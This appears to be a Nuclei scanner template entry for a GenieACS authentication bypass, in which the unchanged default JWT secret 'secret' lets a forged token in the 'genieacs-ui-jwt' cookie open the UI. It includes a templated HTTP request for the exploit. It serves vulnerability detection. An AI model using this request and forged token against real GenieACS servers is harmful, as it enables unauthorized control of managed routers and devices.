# Nuclei Template: GenieACS - Authentication Bypass (Default JWT Secret)
**Template ID:** genieacs-default-jwt
**Vulnerability Class:** Use of Hard-coded Credentials
**Severity:** High
**CWE:** CWE-798
**Source:** Nuclei Template (`genieacs-default-jwt.yaml`)

## Vulnerability Information & PoC

## Description
GenieACS, an Auto Configuration Server (ACS) for TR-069 enabled routers and similar devices, is vulnerable to authentication bypass due to the use of a default JWT secret. During installation, if the default JWT secret "secret" is not changed, an attacker can create a JWT token, sign it, and use this token to log into the GenieACS UI interface. The attack is carried out by setting a cookie named "genieacs-ui-jwt" with its value being the JWT token.

## Steps to reproduce / Exploit Payload
```http
GET /api/presets/?filter=true HTTP/1.1
Host: {{Hostname}}
Accept: application/json, text/*
Cookie: {{cookie_name}}={{default_jwt_secret}}
```

## References
- https://0x00sec.org/t/genieacs-and-the-tale-of-default-jwt-secret/32738
